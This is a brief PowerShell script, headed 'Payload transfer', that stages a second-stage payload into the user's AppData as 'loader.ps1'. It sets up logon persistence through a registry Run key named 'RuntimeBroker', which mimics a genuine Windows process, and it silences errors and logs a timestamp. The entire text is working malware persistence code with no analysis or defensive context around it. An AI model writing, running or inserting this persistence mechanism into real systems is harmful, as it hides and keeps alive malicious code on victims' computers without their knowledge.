# Payload transfer
Copy-Item -Path 'C:\ProgramData\stage2.bin' -Destination "$env:APPDATA\loader.ps1" -Force -ErrorAction SilentlyContinue
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\loader.ps1" + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
